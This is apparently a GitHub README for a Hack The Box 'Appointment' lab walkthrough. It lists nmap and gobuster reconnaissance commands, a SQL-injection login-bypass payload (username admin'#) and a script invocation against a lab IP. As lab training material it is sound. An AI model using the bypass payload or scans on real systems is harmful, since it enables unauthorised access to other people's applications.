# HTB “Appointment” SQL‑Injection Exploit

Exploit a classic SQL‑Injection on Hack The Box’s **Appointment** web app to bypass authentication and retrieve the flag.

---

## 🚀 Quick Start

```
git clone https://github.com/keyfive5/obsidiansignal-htb-appointment.git
cd obsidiansignal-htb-appointment
bash scripts/login-sqli.sh 10.129.99.212
```
📝 Prerequisites
Kali Linux (or any distro with nmap, gobuster, curl)

Active HTB VPN connection

📂 Repository Structure

.
├── README.md
├── writeup/
│   └── lab-writeup.md
├── scripts/
│   └── login-sqli.sh
├── screenshots/
│   ├── nmap.png
│   ├── gobuster.png
│   └── bypass-login.png
└── articles/
    └── appointment-devto.md

🔍 Lab Walkthrough
Nmap Scan
`nmap -sC -sV 10.129.99.212 -o screenshots/nmap.png`

Directory Brute‑Force (optional)

`gobuster dir -u http://10.129.99.212 -w /usr/share/wordlists/dirb/common.txt -o screenshots/gobuster.png`

SQL‑Injection Bypass
- Username: admin'#
- Password: anything
- See login bypass screenshot: screenshots/bypass-login.png

4. Automation

`bash scripts/login-sqli.sh 10.129.99.212`

📄 Write‑Ups & Articles
- Lab Write‑Up: writeup/lab-writeup.md
- Dev.to Tutorial: articles/appointment-devto.md

🤝 Connect
- GitHub: keyfive5
- Dev.to: https://dev.to/keyfive5
- Twitter: https://twitter.com/obsidiansignal0
- LinkedIn: https://linkedin.com/in/mz-cs

“Looking for paid pentesting or cloud‑infra security gigs? Let’s connect!”
